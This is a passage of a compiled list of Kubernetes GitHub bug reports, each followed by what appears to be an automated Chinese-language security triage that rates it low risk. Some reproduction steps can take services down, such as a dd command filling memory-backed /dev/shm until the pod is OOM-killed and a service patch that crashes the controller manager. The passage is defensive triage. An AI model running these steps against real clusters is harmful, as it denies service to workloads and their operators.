    - mountPath: /dev/shm
      name: dshm
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop:
        - ALL
  volumes:
  - name: dshm
    emptyDir:
      medium: Memory
      sizeLimit: 4Gi
```

kubectl exec -it example -- sh
cd /dev/shm/
dd if=/dev/zero of=filename bs=1024 count=2GB
command terminated with exit code 137

In this case, the pod is unable to start again and it gets stuck with:

```
7s          Warning   Failed                    pod/example               Error: failed to create containerd task: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: container init was OOM-killed (memory limit too low?): unknown
```

#### Anything else we need to know?

This is probably a long outstanding issue so its unclear if this will be fixed as a bug.

#### Kubernetes version

<details>

```console
$ kubectl version
1.30
```

</details>


#### Cloud provider

<details>
na
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了当容器使用内存支持的tmpfs并达到OOM（内存不足）限制时，即使重启也会持续发生OOM的问题。具体来说，容器在tmpfs中创建了大文件，导致内存耗尽，容器崩溃。但是，由于tmpfs的内容在容器重启后仍然保留，导致容器无法重新启动，持续出现OOM。

根据风险判断标准：

1. **攻击者利用性**：要触发此问题，需要攻击者在容器内部执行命令写入大量数据到tmpfs。这要求攻击者具有容器内的写权限或命令执行权限。

4. **权限要求降低风险评级**：由于需要攻击者具备非只读权限（写权限或命令执行权限），根据标准，此类拒绝服务（DoS）攻击的风险评级应降低，不应判断为高风险，CVSS评级在high以下。

9. **多用户场景影响**：该问题影响的是容器自身，没有证据表明低权限用户可以通过此问题影响同级或更高权限的其他用户或容器。

因此，根据以上分析，此Issue存在安全风险，但风险评级在high以下，判断为低风险。

---

## Issue #128304 node_lifecycle_controller accidentally removes newly tainted node taints when trying to remove some old taints

- Issue 链接：[#128304](https://github.com/kubernetes/kubernetes/issues/128304)

### Issue 内容

#### What happened?

In my case, our program will try to taint a newly joined master node with our customed taint "node-role.kubernetes.io/master:NoSchedule"
But the taint wasn't there in one of our test case.
After looking into the logs, we found that kube-controller-manager was the most suspicious component.
Kube-controller-manager would update node taint when node gets ready, and it just happened when we tainted the node with kubectl
![image](https://github.com/user-attachments/assets/af5ff6a3-145c-45d4-a738-536430dc47bc)
![image](https://github.com/user-attachments/assets/b594dd1d-ed5d-4bde-821d-97a5af4b16d2)
Then we looked into the code, and found the problem in pkg/controller/controller_utils.go
https://github.com/kubernetes/kubernetes/blob/aa8f2878a588d80b0dc7960c0b82af1882011115/pkg/controller/controller_utils.go#L1115
When it tries to remove a taint, it uses Patch, which would lost the taints tainted by others during Get to Patch



#### What did you expect to happen?

The taint should not be lost

#### How can we reproduce it (as minimally and precisely as possible)?

Modify the code, make some Pause between Get and Patch (sleep() .etc) in function RemoveTaintOffNode
Stop the kubelet on one node, to create not-ready condition
Start the kubelet after not-ready stats has been updated
Use kubectl to create some new taint when the Pause is triggered
Check if the taint is still there after the node was ready

#### Anything else we need to know?

We should probably use Update instead of Patch.
Besides, I don't like it to get node from apiserver cache at first try, because cache data does not guarantee data effectiveness, this could cause inconsistency of node's taints when taints were updated concurrently. This actually happened in another test we ran before, but I didn't keep the logs.

#### Kubernetes version

<details>

```console
Client Version: version.Info{Major:"1", Minor:"25+", GitVersion:"v1.25.3", GitCommit:"d35bc1202891fc160168410ef38cb06782f9c1db", GitTreeState:"dirty", BuildDate:"2024-10-23T16:47:38Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"25+", GitVersion:"v1.25.3", GitCommit:"d35bc1202891fc160168410ef38cb06782f9c1db", GitTreeState:"dirty", BuildDate:"2024-10-23T16:46:14Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在Kubernetes的node_lifecycle_controller中，当尝试移除旧的污点（taints）时，可能会意外地移除新添加的污点。原因是在调用`RemoveTaintOffNode`函数时，使用了Patch方法，由于在`Get`和`Patch`之间没有处理并发修改，可能会导致其他进程在此期间添加的污点被覆盖。

这种情况可能导致节点缺少预期的污点，从而允许本不应该被调度到该节点的Pod被调度上去，影响集群的调度策略和安全性。

然而，要利用这个问题，攻击者需要有权限修改节点的污点信息，通常需要较高的权限（如集群管理员权限）。根据风险判断标准第4条，如果漏洞的利用需要攻击者具备创建、修改等非只读权限，则不应判断为高风险。因此，该问题属于低风险。

此外，该问题不会导致命令执行、容器逃逸、提权等高安全风险的问题，也不涉及多用户场景下的权限提升或越权操作。

---

## Issue #128235 Possible nil dereference in `unmarshalFull` if VarintType is executed before `BytesType`

- Issue 链接：[#128235](https://github.com/kubernetes/kubernetes/issues/128235)

### Issue 内容

#### What happened?

In the `unmarshalFull` function, a nil dereference may occur if the `VarintType` case in the `switch` block is executed before the `BytesType` case.


https://github.com/kubernetes/kubernetes/blob/f1e447b9d32ac325074380d239370cde02a6dbf7/vendor/google.golang.org/protobuf/internal/filedesc/desc_lazy.go#L142-L167

#### What did you expect to happen?

The program should handle such cases correctly without a nil dereference error.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Pass a byte array that contains a tag for `PublicDependency` or `WeakDependency` but does not contain a tag for `Dependency`.

3. Call the `unmarshalFull` function.

#### Anything else we need to know?

Found by Linux Verification Center (linuxtesting.org) with SVACE.
Reporter: Pavel Nekrasov ([p.nekrasov@fobos-nt.ru](mailto:p.nekrasov@fobos-nt.ru)).

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue报告了在`unmarshalFull`函数中，如果`VarintType`在`BytesType`之前执行，可能会发生空指针解引用。这可能导致程序崩溃，从而引发拒绝服务（DoS）攻击。如果攻击者能够控制传入`unmarshalFull`函数的数据，就可能利用该漏洞导致服务崩溃。然而，该函数位于内部包`google.golang.org/protobuf/internal/filedesc`，通常不直接暴露给外部用户。因此，除非存在特殊的攻击面，攻击者能够通过网络传递恶意数据，否则该漏洞的可利用性有限。根据风险判断标准，攻击者需要具备一定权限或特殊条件才能利用该漏洞，且影响主要为服务崩溃，故风险评级为低风险。

---

## Issue #128209 OpenAPI Markdown transformation doesn't handle code blocks well

- Issue 链接：[#128209](https://github.com/kubernetes/kubernetes/issues/128209)

### Issue 内容

We should [render code blocks properly in OpenAPI](https://github.com/kubernetes/kube-openapi/pull/482).

Right now we don't.

---

There is possibly an argument for not using code blocks in the API reference (for example, if we want equations, there may be better options), but equally we may want labelled code blocks where we put eg MathML or LaTex inside a block and have a downstream renderer do something clever).

For now, let's find a basic fix.

/wg api-expression

### 分析结果

**风险定级：**  
低风险

**判断依据：**  
Issue描述了OpenAPI的Markdown转换在处理代码块时存在问题，希望能够正确渲染代码块，尤其是当代码块中可能包含MathML或LaTeX等内容。

可能的安全风险是，如果对代码块的处理不当，可能导致注入攻击，例如跨站脚本（XSS）攻击。如果攻击者可以在代码块中插入恶意代码，并且下游的渲染器在渲染时执行了这些代码，就可能导致安全问题。

但考虑到此问题主要涉及文档渲染，且缺乏进一步的细节，无法确定此风险是否能被攻击者利用，以及其严重程度。

按照风险判断标准，Issue中存在安全风险，但风险评级在High以下，因此风险评级判断为低风险。

---

## Issue #128162 Pod admission can fail due to webhooks + context deadline exceeded, even when all webhooks are set to failurePolicy = Ignore

- Issue 链接：[#128162](https://github.com/kubernetes/kubernetes/issues/128162)

### Issue 内容

#### What happened?

Pod admission failed with the error "Timeout: request did not complete within requested timeout - context deadline exceeded"

This occurred with Datadog's admission controller, when a default deny policy was applied and the network policy allowing ingress to Datadog's admission controller was missing. This is despite each of the webhook configurations specifying `failurePolicy: Ignore`. I can understand why they did that: failing pod admission basically kills the cluster.

#### What did you expect to happen?

Pod should be successfully admitted since all webhooks were set to `failurePolicy: Ignore`

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create 4 mutating or validating webhooks, each with a timeout of 10 seconds, and failurePolicy of Ignore. The webhooks should return an error.
2. Try admitting a Pod. It should work - failurePolicy is set to Ignore.
3. Add a default deny network policy to the webhook's namespace. This will cause connections from the kube-apiserver to the webhook admission controller to fail with a timeout. Overall, 10 seconds will be spent on each one, totaling 40 seconds.
4. Pod admission fails with "Timeout: request did not complete within requested timeout - context deadline exceeded"

#### Anything else we need to know?

It seems that pod admission has a global 30 second timeout. By specifying 4 webhooks, each with a timeout of 10 seconds, it is possible to exceed that timeout and cause pod admission to fail, **even when all webhooks have failurePolicy set to Ignore**. This also results in a message that just says "context deadline exceeded", and doesn't name the offending webhooks, since they didn't actually cause the failure. This makes it super hard to debug, as you have to dig into the kube-apiserver looks to find the offending webhook. It also seems unintentional: my expectation was that having no webhooks set to `failurePolicy: Fail`, pod admission should not be able to fail due to webhooks.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.31.1-eks-ce1d5eb
```

</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
在 Kubernetes 中，当配置了多个 admission webhook，每个 webhook 设置了 10 秒的超时时间并且 failurePolicy 为 Ignore，并且由于网络策略的原因，导致 kube-apiserver 无法连接到这些 webhook，造成每个 webhook 请求都超时，累计耗时超过了 pod admission 的全局 30 秒超时时间，最终导致 pod admission 失败，报错 "Timeout: request did not complete within requested timeout - context deadline exceeded"。

虽然所有的 admission webhook 都设置了 failurePolicy: Ignore，但由于全局超时的存在，pod admission 仍然会失败。这可能导致拒绝服务（DoS）的问题。

根据风险判断标准：

1. 攻击者要利用该风险，需要具备创建或修改 admission webhook 配置或者网络策略的权限。

4. 对于拒绝服务（DoS）攻击，如果攻击者需要一定权限才能实施该攻击，且需要创建、修改等非只读权限，则不应判断为高风险，CVSS 评级在 high 以下。

因此，该问题存在安全风险，但攻击者需要较高权限才能利用，**风险评级为低风险**。

---

## Issue #128156 [Bug] Missing constraint and validation for label selector's values

- Issue 链接：[#128156](https://github.com/kubernetes/kubernetes/issues/128156)

### Issue 内容

#### What happened?

Hello,
There are some [constraints](https://kubernetes.io/docs/concepts/overview/working-with-objects/labels/#syntax-and-character-set) that label selector's `values` need to conform:
>* must be 63 characters or less (can be empty),
>* unless empty, must begin and end with an alphanumeric character ([a-z0-9A-Z]),
>* could contain dashes (-), underscores (_), dots (.), and alphanumerics between.

Every label selctor's `values` will be checked [here](https://github.com/kubernetes/kubernetes/blob/e5ba5cd2b0d3bddd4a0393b98fde14960f31a33c/staging/src/k8s.io/apimachinery/pkg/util/validation/validation.go#L166C1-L175C2), and when values is not conforming these constraints, an error will be returned.

`nodeAfffinty.requiredDuringSchedulingIgnoredDuringExecution.nodeSelectorTerms.matchExpressions.values` also needs to conform these constraints (because `matchExpressions` will be parsed as a label selector), but cccording to the [concept documentation](https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/#operators) and the [API documentation](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.31/#nodeselectorrequirement-v1-core), 
Kubernetes only requires `V1NodeSelectorRequirement.values` to be strings. 
>`values` (string array): An array of string values. If the operator is In or NotIn, the values array must be non-empty. If the operator is Exists or DoesNotExist, the values array must be empty. If the operator is Gt or Lt, the values array must have a single element, which will be interpreted as an integer. This array is replaced during a strategic merge patch.

So when creating a pod with invalid `V1NodeSelectorRequirement.values`, no warning or error message appears and the pod is created successfully.
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: node-affinity-test-pod
  namespace: default
spec:
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: int-cmkzofgjsu
            operator: NotIn
            values:
            - '-1' # <- invalid value
  containers:
  - image: nginx
    name: test-container
# pod/node-affinity-test-pod created <- no warning or error here
```
By contrast, when you set an invalid value in matchFields, it will be rejected.
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: node-affinity-test-pod
  namespace: default
spec:
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchFields:
          - key: metadata.name
            operator: NotIn
            values:
            - '-1'
  containers:
  - image: nginx
    name: test-container
# The Pod "node-affinity-test-pod" is invalid: spec.affinity.nodeAffinity.requiredDuringSchedulingIgnoredDuringExecution.nodeSelectorTerms[0].matchFields[0].values[0]: Invalid value: "-1": a lowercase RFC 1123 subdomain must consist of lower case alphanumeric characters, '-' or '.', and must start and end with an alphanumeric character (e.g. 'example.com', regex used for validation is '[a-z0-9]([-a-z0-9]*[a-z0-9])?(\.[a-z0-9]([-a-z0-9]*[a-z0-9])?)*')
```
---
And after creating the first pod successfully, it couldn’t be scheduled even though one node satisfied its `nodeAffinity`. By adding some log codes, we found that when the scheduler tries to parse a `nodeSelectorTerm`, it receives a non-empty `parseErr`(because the value is not conforming label value constraints as stated above), causing it to consider the entire `nodeSelectorTerm` unmatched. [code](https://github.com/kubernetes/kubernetes/blob/d88b4e3b6e34a85f58778b7ef96e64edffff6823/staging/src/k8s.io/component-helpers/scheduling/corev1/nodeaffinity/nodeaffinity.go#L191C2-L193C3) here.

This behavior may cause the scheduler to make unexpected decisions without the user's awareness. More critically, an invalid value will prevent the entire nodeSelectorTerm from matching.

```yaml
nodeSelectorTerms:
 - matchExpressions:
    - matchExpressions1{key, operator, values} -> has an invalid value, but user is not aware of it
    - matchExpressions2{key, operator, values}
    - ...
   matchFields:
    - matchFields1{key, operator, values}
    - matchFields2{key, operator, values}
    - ...
# matchExpressions1 cannot be parsed, so the whole nodeSelectorTerm is considered as not matched in nodeAffinity
```

#### What did you expect to happen?

* Implicit constraints on the [label selector](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/apimachinery/pkg/labels/selector.go)'s `values` field should be specified in the API documentation and also validated before creating the pod. (We think not only `nodeAfffinty.requiredDuringSchedulingIgnoredDuringExecution.nodeSelectorTerms` will be parsed as label selector, other fields in V1Pod also need to be checked for the same reason.)
* Those implicit constraints should also be added to the concept documentation. (will create an issue in kuberentes/website later)


#### How can we reproduce it (as minimally and precisely as possible)?

Use the yaml file above.

#### Anything else we need to know?

/sig bugs scheduling

#### Kubernetes version

Tested on 1.30.2

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在Kubernetes中，nodeAffinity的`nodeSelectorTerms`的`matchExpressions.values`在创建Pod的时候，没有进行有效性验证，即使`values`包含无效的值，也不会在创建Pod时抛出错误或警告。但是，这会导致调度器在调度Pod时无法匹配到对应的节点，进而导致Pod无法被调度，但用户并不知道原因。

这一问题可能导致用户误以为Pod创建成功并将被调度，但实际上Pod因为无效的nodeAffinity设置而无法调度。这是一个可用性和用户体验问题，但是否存在安全风险？

根据风险判断标准：

1. **该风险能被攻击者利用**：攻击者可以利用这一行为来创建含有无效`nodeAffinity`的Pod。

2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：创建含有无效`nodeAffinity`的Pod可能会导致调度器额外的处理，但不会导致系统崩溃或拒绝服务，影响程度有限，评分不太可能达到high以上。

4. **在风险为拒绝服务（DoS）攻击时，如果攻击者需要一定权限才能够实施该攻击，则视情况需要降级处理，当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险，CVSS评级在high以下**：创建Pod需要具备一定权限，因此即使攻击者能够创建大量含有无效`nodeAffinity`的Pod，也不应判断为高风险。

9. **如果Issue可以发生在多用户场景中，一个低权限用户能够影响和自己权限一样甚至更高的其他用户，如在自身容器中执行命令而影响到他人容器，则应判断为高风险**：该问题不会影响其他用户的容器或权限。

因此，该Issue涉及的风险评级应为**低风险**。

---

## Issue #128121 Crash on kube manager's service-lb-controller after v1.31.0

- Issue 链接：[#128121](https://github.com/kubernetes/kubernetes/issues/128121)

### Issue 内容

#### What happened?

If kube manager is started with no `cloud-provider`, it looks like the service-lb-controller is instantiated but not started. However, part of its initialization happens on the `Run` method **and** its handlers are added to the informer on instantiation. So the handlers still run and it crashes when they do because there is stuff not initialized, like in this case, the event recorder:
```2024-10-14T11:27:20.573127782Z stderr F 	goroutine 735 [running]:
2024-10-14T11:27:20.573132561Z stderr F 	k8s.io/apimachinery/pkg/util/runtime.logPanic({0x38432a0, 0x5545b00}, {0x2d99000, 0x5480790})
2024-10-14T11:27:20.573137951Z stderr F 		k8s.io/apimachinery/pkg/util/runtime/runtime.go:107 +0xbc
2024-10-14T11:27:20.573154772Z stderr F 	k8s.io/apimachinery/pkg/util/runtime.handleCrash({0x38432a0, 0x5545b00}, {0x2d99000, 0x5480790}, {0x5545b00, 0x0, 0x43d945?})
2024-10-14T11:27:20.573159501Z stderr F 		k8s.io/apimachinery/pkg/util/runtime/runtime.go:82 +0x5e
2024-10-14T11:27:20.573187343Z stderr F 	k8s.io/apimachinery/pkg/util/runtime.HandleCrash({0x0, 0x0, 0xc001e5ec40?})
2024-10-14T11:27:20.573192182Z stderr F 		k8s.io/apimachinery/pkg/util/runtime/runtime.go:59 +0x108
2024-10-14T11:27:20.57319655Z stderr F 	panic({0x2d99000?, 0x5480790?})
2024-10-14T11:27:20.573200548Z stderr F 		runtime/panic.go:770 +0x132
2024-10-14T11:27:20.573204836Z stderr F 	k8s.io/cloud-provider/controllers/service.(*Controller).needsUpdate(0xc000978000, 0xc00324c288, 0xc000cf3688)
2024-10-14T11:27:20.573210016Z stderr F 		k8s.io/cloud-provider/controllers/service/controller.go:606 +0xcbb
2024-10-14T11:27:20.573214644Z stderr F 	k8s.io/cloud-provider/controllers/service.New.func2({0x326c8e0?, 0xc00324c288?}, {0x326c8e0, 0xc000cf3688?})
2024-10-14T11:27:20.573219133Z stderr F 		k8s.io/cloud-provider/controllers/service/controller.go:144 +0x74
2024-10-14T11:27:20.573224062Z stderr F 	k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnUpdate(...)
2024-10-14T11:27:20.573228831Z stderr F 		k8s.io/client-go/tools/cache/controller.go:253
2024-10-14T11:27:20.573233339Z stderr F 	k8s.io/client-go/tools/cache.(*processorListener).run.func1()
2024-10-14T11:27:20.573237758Z stderr F 		k8s.io/client-go/tools/cache/shared_informer.go:976 +0xea
2024-10-14T11:27:20.573241875Z stderr F 	k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0x30?)
2024-10-14T11:27:20.57326562Z stderr F 		k8s.io/apimachinery/pkg/util/wait/backoff.go:226 +0x33
2024-10-14T11:27:20.573270419Z stderr F 	k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0xc00311cf70, {0x380e700, 0xc001e3a8a0}, 0x1, 0xc001e3e780)
2024-10-14T11:27:20.573274767Z stderr F 		k8s.io/apimachinery/pkg/util/wait/backoff.go:227 +0xaf
2024-10-14T11:27:20.573279556Z stderr F 	k8s.io/apimachinery/pkg/util/wait.JitterUntil(0xc001e5a770, 0x3b9aca00, 0x0, 0x1, 0xc001e3e780)
2024-10-14T11:27:20.573284085Z stderr F 		k8s.io/apimachinery/pkg/util/wait/backoff.go:204 +0x7f
2024-10-14T11:27:20.573288433Z stderr F 	k8s.io/apimachinery/pkg/util/wait.Until(...)
2024-10-14T11:27:20.573292821Z stderr F 		k8s.io/apimachinery/pkg/util/wait/backoff.go:161
2024-10-14T11:27:20.573297059Z stderr F 	k8s.io/client-go/tools/cache.(*processorListener).run(0xc000892d80)
2024-10-14T11:27:20.573302339Z stderr F 		k8s.io/client-go/tools/cache/shared_informer.go:972 +0x69
2024-10-14T11:27:20.573306677Z stderr F 	k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
2024-10-14T11:27:20.573310975Z stderr F 		k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x52
2024-10-14T11:27:20.573315874Z stderr F 	created by k8s.io/apimachinery/pkg/util/wait.(*Group).Start in goroutine 690
2024-10-14T11:27:20.573320913Z stderr F 		k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0x73
```

Might have been introduced with 
https://github.com/kubernetes/kubernetes/commit/50c12437604b0cd5a73514389409fc2fde8b91bd


#### What did you expect to happen?

No crash.

#### How can we reproduce it (as minimally and precisely as possible)?

```
❯ kind create cluster --name ovn
Creating cluster "ovn" ...
 ✓ Ensuring node image (kindest/node:v1.31.0) 🖼 
 ✓ Preparing nodes 📦  
 ✓ Writing configuration 📜 
 ✓ Starting control-plane 🕹️ 
 ✓ Installing CNI 🔌 
 ✓ Installing StorageClass 💾 
Set kubectl context to "kind-ovn"
You can now use your cluster with:

kubectl cluster-info --context kind-ovn

Not sure what to do next? 😅  Check out https://kind.sigs.k8s.io/docs/user/quick-start/

❯ kind export kubeconfig --name ovn
Set kubectl context to "kind-ovn"

❯ kubectl get pods -A                                                                           
NAMESPACE            NAME                                        READY   STATUS    RESTARTS   AGE
kube-system          coredns-6f6b679f8f-2xrm5                    1/1     Running   0          2m57s
kube-system          coredns-6f6b679f8f-zpkp2                    1/1     Running   0          2m57s
kube-system          etcd-ovn-control-plane                      1/1     Running   0          3m6s
kube-system          kindnet-22kmz                               1/1     Running   0          2m58s
kube-system          kube-apiserver-ovn-control-plane            1/1     Running   0          3m5s
kube-system          kube-controller-manager-ovn-control-plane   1/1     Running   0          3m5s
kube-system          kube-proxy-8z75j                            1/1     Running   0          2m58s
kube-system          kube-scheduler-ovn-control-plane            1/1     Running   0          3m5s
local-path-storage   local-path-provisioner-57c5987fd4-sgvtl     1/1     Running   0          2m57s

❯ cat service.yaml                                                  
apiVersion: v1
kind: Service
metadata:
  name: example-service
spec:
  selector:
    app: example
  ports:
    - port: 8765
      targetPort: 9376
  type: LoadBalancer

❯ kubectl apply -f service.yaml    
service/example-service created

❯ kubectl get pods -A           
NAMESPACE            NAME                                        READY   STATUS    RESTARTS   AGE
kube-system          coredns-6f6b679f8f-2xrm5                    1/1     Running   0          5m15s
kube-system          coredns-6f6b679f8f-zpkp2                    1/1     Running   0          5m15s
kube-system          etcd-ovn-control-plane                      1/1     Running   0          5m24s
kube-system          kindnet-22kmz                               1/1     Running   0          5m16s
kube-system          kube-apiserver-ovn-control-plane            1/1     Running   0          5m23s
kube-system          kube-controller-manager-ovn-control-plane   1/1     Running   0          5m23s
kube-system          kube-proxy-8z75j                            1/1     Running   0          5m16s
kube-system          kube-scheduler-ovn-control-plane            1/1     Running   0          5m23s
local-path-storage   local-path-provisioner-57c5987fd4-sgvtl     1/1     Running   0          5m15s

❯ kubectl patch service example-service -p '{"spec":{"externalTrafficPolicy":"Local"}}'
service/example-service patched

❯ kubectl get pods -A                                                                  
NAMESPACE            NAME                                        READY   STATUS    RESTARTS     AGE
...
kube-system          kube-controller-manager-ovn-control-plane   0/1     Running   1 (2s ago)   6m25s
...
```


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在未指定 'cloud-provider' 时，启动 kube-controller-manager，当创建或修改特定类型的Service时，会导致controller manager 崩溃。具体来说，当创建一个类型为 LoadBalancer 的 Service，并设置 'externalTrafficPolicy' 为 'Local'，会触发 kube-controller-manager 的崩溃。

崩溃的原因是 service-lb-controller 被实例化但未启动，它的部分初始化依赖在 'Run' 方法中进行，但处理程序在实例化时已被添加到 informer，这导致在处理时由于未正确初始化部分组件（如事件记录器），从而引发 panic。

根据风险判断标准，尽管攻击者可以通过创建或修改特定的 Service 来导致 kube-controller-manager 崩溃，但这需要具备创建或修改 Service 的权限，这是非只读权限。根据标准4，如果漏洞利用需要攻击者具备创建、修改等非只读权限，则不应判断为高风险。

因此，该问题的风险评级判断为低风险。

---

## Issue #127992 Components hang forever due to a bug in parsing allow metric labels manifest

- Issue 链接：[#127992](https://github.com/kubernetes/kubernetes/issues/127992)

### Issue 内容

#### What happened?

The components hang forever when initializing with `allow-metric-labels-manifest` is set.

For example, kube-scheduler set the flag as follows
```
root@dev-control-plane:/etc/kubernetes/manifests# cat kube-scheduler.yaml |grep -A8 command
  - command:
    - kube-scheduler
    - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf
    - --authorization-kubeconfig=/etc/kubernetes/scheduler.conf
    - --bind-address=127.0.0.1
    - --kubeconfig=/etc/kubernetes/scheduler.conf
    - --leader-elect=true
    - --allow-metric-labels-manifest=/etc/kubernetes/allow-list.yaml
    image: registry.k8s.io/kube-scheduler:v1.30.0
```
It hangs forever
```
root@dev-control-plane:/etc/kubernetes# kubectl logs -n kube-system kube-scheduler-dev-control-plane -f
I1011 00:10:55.222334       1 serving.go:380] Generated self-signed cert in-memory



^C
```

It should be due to the bug in function [SetLabelAllowListFromManifest](https://github.com/kubernetes/kubernetes/blob/c15581b277e9e42d830898357fdbd92dcf7981c6/staging/src/k8s.io/component-base/metrics/opts.go#L366) which locks the `allowListLock` and tries to double lock in [here](https://github.com/kubernetes/kubernetes/blob/c15581b277e9e42d830898357fdbd92dcf7981c6/staging/src/k8s.io/component-base/metrics/opts.go#L379)

#### What did you expect to happen?

The component start and run properly. e.g.
```
root@dev-control-plane:/etc/kubernetes/manifests# kubectl logs -n kube-system kube-scheduler-dev-control-plane -f
I1011 00:20:14.946492       1 serving.go:380] Generated self-signed cert in-memory
I1011 00:20:15.109004       1 server.go:154] "Starting Kubernetes Scheduler" version="v1.30.0"
I1011 00:20:15.109046       1 server.go:156] "Golang settings" GOGC="" GOMAXPROCS="" GOTRACEBACK=""
I1011 00:20:15.113642       1 configmap_cafile_content.go:202] "Starting controller" name="client-ca::kube-system::extension-apiserver-authentication::client-ca-file"
I1011 00:20:15.113671       1 configmap_cafile_content.go:202] "Starting controller" name="client-ca::kube-system::extension-apiserver-authentication::requestheader-client-ca-file"
I1011 00:20:15.113643       1 requestheader_controller.go:169] Starting RequestHeaderAuthRequestController
I1011 00:20:15.113762       1 secure_serving.go:213] Serving securely on 127.0.0.1:10259
I1011 00:20:15.113802       1 shared_informer.go:313] Waiting for caches to sync for RequestHeaderAuthRequestController
I1011 00:20:15.113869       1 tlsconfig.go:240] "Starting DynamicServingCertificateController"
I1011 00:20:15.113668       1 shared_informer.go:313] Waiting for caches to sync for client-ca::kube-system::extension-apiserver-authentication::client-ca-file
I1011 00:20:15.113707       1 shared_informer.go:313] Waiting for caches to sync for client-ca::kube-system::extension-apiserver-authentication::requestheader-client-ca-file
I1011 00:20:15.214278       1 shared_informer.go:320] Caches are synced for client-ca::kube-system::extension-apiserver-authentication::client-ca-file
I1011 00:20:15.214325       1 leaderelection.go:250] attempting to acquire leader lease kube-system/kube-scheduler...
I1011 00:20:15.214474       1 shared_informer.go:320] Caches are synced for client-ca::kube-system::extension-apiserver-authentication::requestheader-client-ca-file
I1011 00:20:15.214495       1 shared_informer.go:320] Caches are synced for RequestHeaderAuthRequestController
I1011 00:20:32.976351       1 leaderelection.go:260] successfully acquired lease kube-system/kube-scheduler
```

#### How can we reproduce it (as minimally and precisely as possible)?

Mount the correct format allow-list manifest to the pod and set the `--allow-metric-label-manfiests` flag
e.g. static kube-scheduler manfiest
```
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-scheduler
    tier: control-plane
  name: kube-scheduler
  namespace: kube-system
spec:
  containers:
  - command:
    - kube-scheduler
    - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf
    - --authorization-kubeconfig=/etc/kubernetes/scheduler.conf
    - --bind-address=127.0.0.1
    - --kubeconfig=/etc/kubernetes/scheduler.conf
